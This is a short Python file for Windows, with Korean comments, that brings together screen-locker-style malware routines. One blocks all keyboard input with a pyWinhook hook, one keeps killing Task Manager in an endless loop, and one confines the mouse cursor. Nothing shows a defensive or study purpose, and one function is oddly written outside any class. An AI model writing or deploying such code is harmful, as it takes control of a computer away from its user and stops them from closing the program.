import os
import psutil
import pyWinhook
import time
import win32api

class blockInput(): # 키보드 입력 차단
    def OnKeyboardEvent(self, event):
        return False

    def block(self, keyboard = True):
        if keyboard:
            self.hm.KeyAll = self.OnKeyboardEvent
            self.hm.HookKeyboard()

    def __init__(self):
        self.hm = pyWinhook.HookManager()

def disTask(): # 작업관리자 무력화
    while True:
        iter = psutil.process_iter()
        for process in iter:
            try:
                if "taskmgr.exe" in process.name().lower():
                    print("catch")
                    os.system("taskkill /f /im taskmgr.exe")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                print("except")
                pass

def cursor(self): # 커서 가두기
    while True:
        width, height = self.GetSize()
        win32api.ClipCursor((0, 0, width - 2, height))
        time.sleep(1)